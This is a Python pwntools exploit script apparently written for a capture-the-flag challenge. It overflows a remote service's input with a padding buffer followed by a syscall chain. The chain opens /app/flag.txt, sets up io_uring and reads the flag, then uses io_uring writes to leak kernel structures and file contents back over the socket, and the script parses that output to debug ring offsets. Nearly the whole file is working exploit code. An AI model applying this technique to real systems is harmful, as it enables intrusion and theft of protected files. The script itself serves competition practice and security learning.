#!/usr/bin/env python3
"""Leak the REMOTE kernel's io_uring layout, then read the flag with it.

Same binary + Dockerfile local vs remote -> only the kernel differs. solve.py
hardcodes io_uring ring offsets captured on the LOCAL kernel (SQ_ARRAY_OFF=320,
sq head/tail at ring+0). io_uring WRITE works remote (proven), so we use it to
exfil the kernel-returned io_uring_params (real sq_off/cq_off) + the CQ ring
(the READ's completion res / errno). Then we know exactly why READ fails and
with what offsets to retry.

Run:  uv run python leak_iouring.py [host] [port]
"""
import os
import re
import struct
import sys

from pwn import context, remote

context.arch = "amd64"
context.log_level = "error"

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import solve as S

HOST = sys.argv[1] if len(sys.argv) > 1 else "elijah-balls.chal.zip"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 32267


def enter_idx(ring_fd, idx):
    """Submit the single sqe currently at SQES[0]: sq_array[0]=0, head=idx, tail=idx+1."""
    c = S.setmem64(S.RINGS + S.SQ_ARRAY_OFF, 0)
    c += S.setmem64(S.RINGS + 0, ((idx + 1) << 32) | idx)
    c += S.wsyscall(S.SYS_IO_URING_ENTER, ring_fd, 1, 1, S.IORING_ENTER_GETEVENTS)
    return c


def shoot(chain):
    payload = b"A" * S.OFF + chain
    assert b"\n" not in payload, "payload has newline"
    io = remote(HOST, PORT, timeout=8)
    io.sendline(payload)
    d = io.recvall(timeout=8) or b""
    try:
        io.close()
    except Exception:
        pass
    return d


def build_leak():
    c = S.writebytes(S.PATH, b"/app/flag.txt\x00")
    c += S.wsyscall(S.SYS_OPENAT2, S.AT_FDCWD, S.PATH, S.HOW, 24)        # -> fd 3
    c += S.setmem64(S.PARAMS + S.P_FLAGS, S.IORING_SETUP_NO_MMAP)
    c += S.setmem64(S.PARAMS + S.P_CQ_USER, S.RINGS)
    c += S.setmem64(S.PARAMS + S.P_SQ_USER, S.SQES)
    c += S.wsyscall(S.SYS_IO_URING_SETUP, 8, S.PARAMS, 0, 0)            # -> ring fd 4
    # submit a READ of the flag
    c += S.build_sqe(S.IORING_OP_READ, 3, S.FILEBUF, 0x80, 0, 0x1111)
    c += enter_idx(4, 0)
    # leak PARAMS (120B) -> real sq_off/cq_off
    c += S.build_sqe(S.IORING_OP_WRITE, 1, S.PARAMS, 120, 0, 0x2222)
    c += enter_idx(4, 1)
    # leak RINGS (512B) -> CQ head/tail + CQEs (READ result)
    c += S.build_sqe(S.IORING_OP_WRITE, 1, S.RINGS, 0x200, 0, 0x3333)
    c += enter_idx(4, 2)
    # leak FILEBUF (128B) -> did READ actually land data?
    c += S.build_sqe(S.IORING_OP_WRITE, 1, S.FILEBUF, 0x80, 0, 0x4444)
    c += enter_idx(4, 3)
    c += S.wsyscall(231, 0)
    return c


def u32(b, o):
    return struct.unpack_from("<I", b, o)[0]


def main():
    print(f"=== leak {HOST}:{PORT} ===")
    d = shoot(build_leak())
    print(f"total leaked: {len(d)}B  (expect 760 = 120+512+128)")
    if len(d) < 120:
        print("[-] leak failed; io_uring WRITE not producing output here")
        print(f"    raw={d!r}")
        return 1

    p = d[:120]
    feats = u32(p, 20)
    sq = struct.unpack_from("<8I", p, 40)      # head,tail,mask,entries,flags,dropped,array,resv
    sq_user = struct.unpack_from("<Q", p, 72)[0]
    cq = struct.unpack_from("<8I", p, 80)      # head,tail,mask,entries,overflow,cqes,flags,resv
    cq_user = struct.unpack_from("<Q", p, 112)[0]
    print(f"features = 0x{feats:x}")
    print(f"sq_off : head={sq[0]} tail={sq[1]} mask={sq[2]} entries={sq[3]} "
          f"flags={sq[4]} dropped={sq[5]} array={sq[6]} user=0x{sq_user:x}")
    print(f"cq_off : head={cq[0]} tail={cq[1]} mask={cq[2]} entries={cq[3]} "
          f"overflow={cq[4]} cqes={cq[5]} flags={cq[6]} user=0x{cq_user:x}")
    print(f"OUR ASSUMPTIONS: sq_array_off={S.SQ_ARRAY_OFF}, sq head/tail at ring+0")
    print(f">> sq.array match: {sq[6] == S.SQ_ARRAY_OFF} ; sq.head@0: {sq[0] == 0} ; sq.tail@? {sq[1]}")

    rings = d[120:120 + 0x200]
    if len(rings) >= 0x200:
        cq_head = u32(rings, cq[0]) if cq[0] + 4 <= len(rings) else None
        cq_tail = u32(rings, cq[1]) if cq[1] + 4 <= len(rings) else None
        print(f"CQ ring: head={cq_head} tail={cq_tail}  (tail>0 => a completion posted)")
        cqes_off = cq[5]
        if cqes_off + 16 <= len(rings):
            ud, res, fl = struct.unpack_from("<QiI", rings, cqes_off)
            human = f"{res} bytes read" if res >= 0 else f"errno {-res}"
            print(f"CQE[0]: user_data=0x{ud:x} res={res} ({human}) flags=0x{fl:x}")

    filebuf = d[120 + 0x200:120 + 0x200 + 0x80]
    if filebuf:
        print(f"FILEBUF[:64] = {filebuf[:64]!r}")
        m = re.search(rb"grey\{[^}]*\}", filebuf)
        if m:
            print(f"\n[+] FLAG: {m.group(0).decode()}")
            return 0
    print("\n[i] decode above: CQE res tells WHY read failed; sq/cq offsets tell if our hardcodes are wrong")
    return 0


if __name__ == "__main__":
    sys.exit(main())
